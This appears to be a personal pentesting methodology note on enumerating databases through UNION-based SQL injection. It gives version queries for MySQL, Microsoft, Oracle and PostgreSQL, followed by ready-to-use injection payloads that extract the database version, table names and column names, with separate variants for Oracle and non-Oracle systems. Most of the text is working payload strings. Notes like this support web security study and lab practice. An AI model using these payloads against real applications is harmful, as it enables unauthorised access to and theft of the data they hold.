# Methodology Examining the database
#METHODOLOGY
#DATABASEENUM 

## Database type and version

Try to obtain the database banner or version, the query/payload to use depends on the database software.

Database type| Query
------------ | ------------
Microsoft, MySQL|`SELECT @@version`
Oracle|`SELECT * FROM v$version`
PostgreSQL|`SELECT version()`

These queries can be used on an `UNION` attack to craft an adequate payload to retrieve information.

###  UNION SQL injection payload for type and version

The number of columns on the payload and which can hold string data depends on the results of the [[Methodology UNION attacks]] in this case two result columns are assumed.

Database type| Query
------------ | ------------
Microsoft, MySQL|`' UNION SELECT @@version,NULL--`
Oracle|`' UNION SELECT banner,NULL FROM v$version--`
PostgreSQL|`' UNION SELECT version(),NULL--`

<hr>

# Listing contents of the database

## Non- Oracle databases

### Tables

The tables enumeration is based on the `information_schema.tables` table, using the following query:

```SQL
SELECT * FROM information_schema.tables
```

#### UNION SQL injection payload to get tables names

The number of columns on the payload and which can hold string data depends on the results of the [[Methodology UNION attacks]] in this case two result columns are assumed.

```SQL
' UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--
```

### Columns

The tables enumeration is based on the `information_schema.columns` table, using the following query:

```SQL
SELECT * FROM information_schema.columns WHERE table_name = '$TABLE'
```

#### UNION SQL injection payload to get columns names

The number of columns on the payload and which can hold string data depends on the results of the [[Methodology UNION attacks]] in this case two result columns are assumed.

```SQL
' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = '$TABLE NAME$'--
```

<hr>

## Oracle databases

### Tables

The tables enumeration is based on the `all_tables` table, using the following query:

```SQL
SELECT * FROM all_tables
```

#### UNION SQL injection payload to get tables names

The number of columns on the payload and which can hold string data depends on the results of the [[Methodology UNION attacks]] in this case two result columns are assumed.

```SQL
' UNION SELECT TABLE_NAME,NULL FROM all_tables--
```

### Columns

The tables enumeration is based on the `all_tab_columns` table, using the following query:

```SQL
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

#### UNION SQL injection payload to get tables names

The number of columns on the payload and which can hold string data depends on the results of the [[Methodology UNION attacks]] in this case two result columns are assumed.

```SQL
' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_PGXVFU'--
```

